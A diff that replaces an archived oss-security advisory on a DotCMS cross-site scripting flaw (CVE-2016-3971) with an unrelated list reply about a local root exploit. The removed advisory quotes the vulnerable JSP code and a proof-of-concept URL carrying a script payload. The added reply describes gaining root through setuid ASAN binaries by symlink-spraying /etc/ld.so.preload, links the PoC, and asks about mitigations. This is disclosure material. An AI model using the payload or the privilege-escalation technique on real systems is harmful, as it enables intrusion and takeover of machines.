@@ -1,40 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/08/2
-Message-ID: <CAA0JNpS5KzKvug_xPubFpbfj-7SMBhKj_-jXzJRfGFCx8fYdGA@mail.gmail.com>
-Date: Fri, 8 Apr 2016 11:09:55 +0800
-From: xiong piaox <yahoo860201@...il.com>
-To: fulldisclosure@...lists.org
-Cc: bugs@...uritytracker.com, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
-Subject: [CVE-2016-3971]DotCMS xss vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/18/16
+Message-ID: <56C6516E.7040808@xiphosresearch.co.uk>
+Date: Thu, 18 Feb 2016 23:19:10 +0000
+From: Darren Martyn <darren.martyn@...hosresearch.co.uk>
+To: oss-security@...ts.openwall.com
+Subject: Re: Address Sanitizer local root
 Content-Type: text/plain; charset=utf-8
 
-Advisory: DotCMS xss vulnerability
+Hi List,
+Figured I would add this to the thread to keep it amusing.
 
-Author: Piaox From Pingan Product Safety Group
+Here is a fully functioning local root by clobbering /etc/ld.so.preload
+instead of /etc/shadow (which breaks things spectacularly). I am using a
+fairly messy "symlink spray"/"symlink carpet bombing" technique.
 
-Email: xiongyaofu351@...gan.com.cn
+Simply point it at a setuid-root binary compiled with asan and away it
+goes.
 
-Affected Version: dotCMS 3.5 Beta(the latest version)
+Video: https://www.youtube.com/watch?v=jhSIm3auQMk
+PoC Code: https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e
+
+Development/Testing was done on a Debian 8.3 VM that was last updated
+last week.
+
+Now, I wonder - what can actually be done to mitigate against this,
+besides "don't use ASAN in production"?
+Is there something that can be done ASAN-side?
+Because due to how ld.so.preload is parsed so, uh, forgivingly, all the
+attacker needs to control is one line in the output file. Could it check
+for symlinks before writing the log?
+
+Regards,
+Darren.
 
 
-Vulnerability Description
-
-lucene_search.jsp
-
- 26 String query = request.getParameter("query");
-
- 27 if(!UtilMethods.isSet(query)){
-
- 28         query = "";
-
- 29 }
-
-164                 <div><strong><%= LanguageUtil.get(pageContext,
-"Query-is") %> : </strong><%=query%></div>
-
-POC && EXP
-
-http://127.0.0.1:8080/c/portal/layout?p_l_id=a8e430e3-8010-40cf-ade1-5978e61241a8&p_p_id=EXT_LUCENE_TOOL&p_p_action=0&
-
-query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&offset=0&limit=20&sort=&userid=
-
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
